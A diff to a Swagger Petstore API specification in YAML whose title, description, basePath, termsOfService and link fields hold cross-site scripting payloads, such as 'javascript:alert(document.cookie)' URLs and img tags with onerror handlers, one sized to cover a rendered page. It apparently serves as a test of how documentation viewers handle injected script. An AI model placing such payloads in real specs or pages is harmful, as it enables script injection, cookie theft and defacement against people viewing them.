@@ -1,8 +1,8 @@
 swagger: "2.0"
 info:
-  description: "This is a sample server Petstore server.  You can find out more about     Swagger at javascript:alert(document.cookie).      For this sample, you can use the api key `<img src=c onerror=alert(1)>` to test the authorization javascript:alert(document.cookie)    filters. " 
+  description: "<img src=https://media.wired.com/photos/5c0b012587e1b12d64ab1697/master/pass/Quora-Hacked_Final.png onerror=alert(1); style='height:2000px;width:2000px;float:top;'> filters." 
   version: "1.0.0"
-  title: "'javascript:alert(document.cookie)"
+  title: "Jonathan JOhx"
   termsOfService: "'javascript:alert(document.cookie)"
   contact:
     email: "alert@gmail.om"
@@ -13,9 +13,9 @@ host: "petstore.swagger.io"
 basePath: "/javascript:alert(document.cookie)"
 tags:
 - name: "user"
-  description: "<img src=c onerror=alert(1)>"
+  description: "<img src=https://media.wired.com/photos/5c0b012587e1b12d64ab1697/master/pass/Quora-Hacked_Final.png onerror=alert(1);>"
   externalDocs:
-    description: "<img src=c onerror=alert(1)>"
+    description: "TESTING"
     url: "javascript:alert(document.cookie)"
 schemes:
 - "https"
